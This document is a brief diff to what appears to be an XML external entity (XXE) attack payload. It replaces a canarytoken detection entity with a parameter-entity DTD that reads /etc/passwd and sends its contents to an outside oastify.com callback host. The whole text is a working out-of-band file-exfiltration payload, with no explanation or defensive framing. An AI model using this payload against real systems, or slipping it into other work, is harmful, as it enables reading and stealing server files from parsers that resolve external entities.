@@ -1,6 +1,4 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE data [
-   <!ENTITY dtd SYSTEM
-  "http://canarytokens.com/images/traffic/about/dhd774x13jhind4kr5qf6t8gk/submit.aspx">
-]>
-<data>&dtd;</data>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://b6if327geax45lf3d9b563v3muslge43.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
